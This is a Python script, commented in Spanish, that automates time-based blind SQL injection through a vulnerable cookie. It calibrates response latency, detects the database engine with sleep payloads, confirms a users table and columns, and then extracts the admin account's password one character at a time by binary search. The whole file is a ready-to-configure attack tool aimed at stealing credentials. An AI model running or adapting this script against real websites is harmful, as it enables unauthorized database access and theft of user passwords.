import sys
import time
import argparse
import urllib.parse
import requests
import urllib3

from dbms_profiles import DB_PROFILES

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



#------------------CONFIGURACIÓN GENERAL---------------


TARGET_URL = "https://..................................."

VULNERABLE_COOKIE_NAME = "name"
VULNERABLE_COOKIE_VALUE = "value"

EXTRA_COOKIES = {
    "session": "value",
}

TABLE_NAME = "users"
USERNAME_COLUMN = "username"
PASSWORD_COLUMN = "password"
TARGET_USERNAME = "admin"

MAX_PASSWORD_LENGTH = 50
ASCII_LOW = 32
ASCII_HIGH = 126

# "auto" | oracle | postgresql | mysql | mssql
DBMS = "auto"

# Segundos de sleep inyectados cuando la condición es TRUE.
# 3s es suficiente para distinguir de la latencia normal (~0.3s).
SLEEP_TIME = 3

# Umbral: se calcula automáticamente como baseline + SLEEP_TIME * 0.6
# pero puedes forzarlo manualmente poniendo un valor > 0 aquí.
THRESHOLD = 0  # 0 = auto-calibrar

REQUEST_TIMEOUT = 15
VERIFY_SSL = False
VERBOSE = True

HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/131.0.0.0 Safari/537.36"
    ),
    "Accept": (
        "text/html,application/xhtml+xml,application/xml;"
        "q=0.9,image/avif,image/webp,*/*;q=0.8"
    ),
    "Accept-Language": "es-ES,es;q=0.9,en;q=0.8",
}



# --------------------MOTOR----------------------


class BlindSQLiTimeBased:

    def __init__(self):
        self.session = requests.Session()
        self.session.verify = VERIFY_SSL
        self.dbms = None
        self.profile = None
        self.request_count = 0
        self.threshold = THRESHOLD
        self.baseline = 0.0

    # ── URL-encode + enviar ───────────────────────────────────────
    def send(self, injection: str, label: str = "") -> bool:
        encoded = urllib.parse.quote_plus(injection, safe="'(),_.-*!:/~")
        cookie_value = VULNERABLE_COOKIE_VALUE + encoded
        cookie_parts = [f"{VULNERABLE_COOKIE_NAME}={cookie_value}"]
        for k, v in EXTRA_COOKIES.items():
            cookie_parts.append(f"{k}={v}")

        try:
            start = time.time()
            r = self.session.get(
                TARGET_URL,
                headers={**HEADERS, "Cookie": "; ".join(cookie_parts)},
                timeout=REQUEST_TIMEOUT,
            )
            elapsed = time.time() - start
            self.request_count += 1
            hit = elapsed >= self.threshold

            if VERBOSE and label:
                icon = "OK" if hit else "x"
                print(f"    [{icon}] {label} → {elapsed:.2f}s | HTTP {r.status_code}")
            return hit

        except requests.exceptions.Timeout:
            self.request_count += 1
            if VERBOSE and label:
                print(f"    [OK] {label} → TIMEOUT — TRUE")
            return True
        except requests.RequestException as e:
            print(f"    [!] Error de red: {e}")
            return False

    def fmt(self, tpl: str, **kw) -> str:
        return tpl.format(comment=self.profile["comment"], sleep=SLEEP_TIME, **kw)

    # ── Calibración automática del threshold ──────────────────────
    def calibrate(self):
        print("\n[*] Calibrando latencia base (3 muestras)...")
        samples = []
        for i in range(3):
            start = time.time()
            self.send("", f"muestra {i+1}")
            samples.append(time.time() - start)
        self.baseline = sum(samples) / len(samples)

        if THRESHOLD > 0:
            self.threshold = THRESHOLD
        else:
            self.threshold = self.baseline + SLEEP_TIME * 0.6

        print(f"    Latencia base: {self.baseline:.2f}s")
        print(f"    Threshold:     {self.threshold:.2f}s")
        print(f"    Sleep time:    {SLEEP_TIME}s")

    # ── Detección de DBMS ─────────────────────────────────────────
    def detect_dbms(self) -> str | None:
        print("\n" + "=" * 60)
        print("  FASE 0 · Detección del DBMS")
        print("=" * 60)

        self.calibrate()

        for db_key in ["postgresql", "mssql", "mysql", "oracle"]:
            p = DB_PROFILES[db_key]
            payload = p["fingerprint"].format(comment=p["comment"], sleep=SLEEP_TIME)
            print(f"\n[*] Probando {p['name']}...")
            if self.send(payload, f"{p['name']} sleep({SLEEP_TIME}s)"):
                print(f"\n[OK] DBMS detectado: {p['name']}")
                return db_key

        print("\n[x] No se detectó ningún DBMS.")
        return None

    # ── Verificaciones (1 petición cada una) ──────────────────────
    def check_table(self) -> bool:
        print(f"\n[*] ¿Existe tabla '{TABLE_NAME}'?")
        payload = self.fmt(self.profile["table_exists"], table=TABLE_NAME)
        ok = self.send(payload, f"tabla '{TABLE_NAME}'")
        print(f"    [{'OK' if ok else 'x'}] Tabla '{TABLE_NAME}' {'existe' if ok else 'NO encontrada'}")
        return ok

    def check_column(self, col: str) -> bool:
        print(f"[*] ¿Existe columna '{col}'?")
        payload = self.fmt(self.profile["column_exists"], table=TABLE_NAME, column=col)
        ok = self.send(payload, f"columna '{col}'")
        print(f"    [{'OK' if ok else 'x'}] Columna '{col}' {'existe' if ok else 'NO encontrada'}")
        return ok

    def check_user(self) -> bool:
        print(f"\n[*] ¿Existe usuario '{TARGET_USERNAME}'?")
        payload = self.fmt(
            self.profile["user_exists"],
            table=TABLE_NAME, col_user=USERNAME_COLUMN, user=TARGET_USERNAME,
        )
        ok = self.send(payload, f"usuario '{TARGET_USERNAME}'")
        print(f"    [{'OK' if ok else 'x'}] Usuario '{TARGET_USERNAME}' {'existe' if ok else 'NO encontrado'}")
        return ok

    # ── Longitud del password (búsqueda binaria) ──────────────────
    def get_password_length(self) -> int:
        print("\n[*] Longitud del password (búsqueda binaria)...")
        lo, hi = 0, MAX_PASSWORD_LENGTH
        while lo < hi:
            mid = (lo + hi) // 2
            payload = self.fmt(
                self.profile["password_length"],
                table=TABLE_NAME, col_user=USERNAME_COLUMN,
                col_pass=PASSWORD_COLUMN, user=TARGET_USERNAME, length=mid,
            )
            if self.send(payload, f"LENGTH > {mid}"):
                lo = mid + 1
            else:
                hi = mid
        print(f"    [OK] Longitud: {lo}")
        return lo

    # ── Extraer carácter (búsqueda binaria) ───────────────────────
    def extract_char(self, pos: int) -> str:
        lo, hi = ASCII_LOW, ASCII_HIGH
        while lo < hi:
            mid = (lo + hi) // 2
            payload = self.fmt(
                self.profile["extract_char"],
                table=TABLE_NAME, col_user=USERNAME_COLUMN,
                col_pass=PASSWORD_COLUMN, user=TARGET_USERNAME,
                pos=pos, mid=mid,
            )
            if self.send(payload, f"pos={pos} ASCII>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return chr(lo)

    # ── Flujo principal ───────────────────────────────────────────
    def run(self):
        print(r"""
  --------------------MOTOR----------------------
         Blind SQLi · Time-Based        
  -----------------------------------------------""")
        print(f"  Target  : {TARGET_URL}")
        print(f"  Tabla   : {TABLE_NAME}  |  Usuario: {TARGET_USERNAME}")
        print(f"  DBMS    : {DBMS}  |  Sleep: {SLEEP_TIME}s")

        # FASE 0: DBMS
        if DBMS == "auto":
            detected = self.detect_dbms()
            if not detected:
                sys.exit(1)
            self.dbms = detected
        else:
            if DBMS not in DB_PROFILES:
                print(f"[!] DBMS '{DBMS}' no soportado: {', '.join(DB_PROFILES)}")
                sys.exit(1)
            self.dbms = DBMS
            self.calibrate()
            print(f"\n[*] Verificando {DB_PROFILES[DBMS]['name']}...")
            p = DB_PROFILES[self.dbms]
            payload = p["fingerprint"].format(comment=p["comment"], sleep=SLEEP_TIME)
            if not self.send(payload, "fingerprint"):
                print("[x] No se detectó retraso. Verifica cookies/URL.")
                sys.exit(1)
            print(f"[OK] {DB_PROFILES[DBMS]['name']} confirmado")

        self.profile = DB_PROFILES[self.dbms]

        # FASE 1: Estructura (1 petición por verificación)
        print("\n" + "=" * 60)
        print("  FASE 1 · Verificación de estructura")
        print("=" * 60)

        if not self.check_table():
            sys.exit(1)
        self.check_column(USERNAME_COLUMN)
        self.check_column(PASSWORD_COLUMN)
        if not self.check_user():
            sys.exit(1)

        # FASE 2: Longitud
        print("\n" + "=" * 60)
        print("  FASE 2 · Longitud del password")
        print("=" * 60)

        pwd_len = self.get_password_length()
        if pwd_len == 0:
            print("[!] Longitud = 0. ¿Password vacío?")
            sys.exit(1)

        # FASE 3: Extracción
        print("\n" + "=" * 60)
        print(f"  FASE 3 · Extrayendo password ({pwd_len} chars)")
        print("=" * 60)

        avg_per_char = 7 * (SLEEP_TIME + self.baseline) / 2
        print(f"\n  Estimación: ~{avg_per_char * pwd_len:.0f}s "
              f"({avg_per_char * pwd_len / 60:.1f} min)\n")

        t0 = time.time()
        password = ""

        for pos in range(1, pwd_len + 1):
            tc = time.time()
            ch = self.extract_char(pos)
            password += ch
            elapsed_char = time.time() - tc
            elapsed_total = time.time() - t0
            eta = (pwd_len - pos) * (elapsed_total / pos)
            print(
                f"  [{pos:2d}/{pwd_len}]  '{ch}'  "
                f"(ASCII {ord(ch):3d})  →  {password}  "
                f"[{elapsed_char:.1f}s | total {elapsed_total:.0f}s | "
                f"ETA {eta:.0f}s | {self.request_count} reqs]"
            )

        total = time.time() - t0
        print("\n" + "═" * 60)
        print(f"  OK PASSWORD: {password}")
        print(f"  OK Usuario:  {TARGET_USERNAME}")
        print(f"  OK DBMS:     {self.profile['name']}")
        print(f"  OK Requests: {self.request_count}")
        print(f"  OK Tiempo:   {total:.1f}s ({total/60:.1f} min)")
        print("═" * 60 + "\n")
        return password
